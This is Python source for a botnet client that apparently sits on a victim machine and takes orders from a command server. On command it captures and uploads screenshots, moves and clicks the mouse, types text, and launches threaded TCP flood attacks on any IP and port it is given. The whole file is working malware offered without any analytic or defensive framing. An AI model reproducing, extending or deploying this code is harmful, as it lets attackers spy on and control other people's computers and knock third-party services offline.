import autopy,socket,random,threading,time
from time import sleep
from autopy import bitmap
from socket import socket,AF_INET,SOCK_STREAM

con=True

#dos function :
def dos(ip,port):
    while con:
        s=socket(AF_INET,SOCK_STREAM)
        s.connect((ip,port))
        s.send(b"fucked by a botnet maaaaaaaaaan")
        print("done")
        s.close()
def call(number_of_threads,ip,port,ti):
    global con
    for i in range(int(number_of_threads)):
        x=threading.Thread(target=dos,args=(ip,int(port)))
        x.start()
    sleep(int(ti))
    con=False
while 1:

    #creating file name :
    rand = str(random.randrange(563,10000000))

    #getting ready for screen capturing :
    image = bitmap.capture_screen()

    #making socket and connecting :
    s=socket(AF_INET,SOCK_STREAM)
    s.connect(("127.0.0.1",1295))

    #receving command :
    r=s.recv(100)

    #screenshot sending :
    if r.decode() == "send screenshot":
        #capturing screen :
        save = image.save(rand+".png")

        #sending picture bytes to server :
        o=open(rand+".png","rb")
        s.sendall(o.read())
    
    #moving the mouse :
    elif r.decode().split(" ")[0] == "mouse" :
        try :
            x=int(r.decode().split(" ")[1])
            y=int(r.decode().split(" ")[2])
            autopy.mouse.smooth_move(x,y)
        except:
            s.send(b"[error] wrong x or y")
        else:
            s.send(b"success")

    #left clicking :
    elif r.decode() == "lc":
        autopy.mouse.click()
        autopy.mouse.click()

    #typing :
    elif r.decode() == "keyboard type":
        s.send(b"ok")
        r=s.recv(1000000)
        autopy.key.type_string(str(r.decode()))

    elif r.decode().split(" ")[0] == "dos":
        call(r.decode().split(" ")[3],r.decode().split(" ")[1],r.decode().split(" ")[2],r.decode().split(" ")[4])
    #closing the connection :
    s.close()
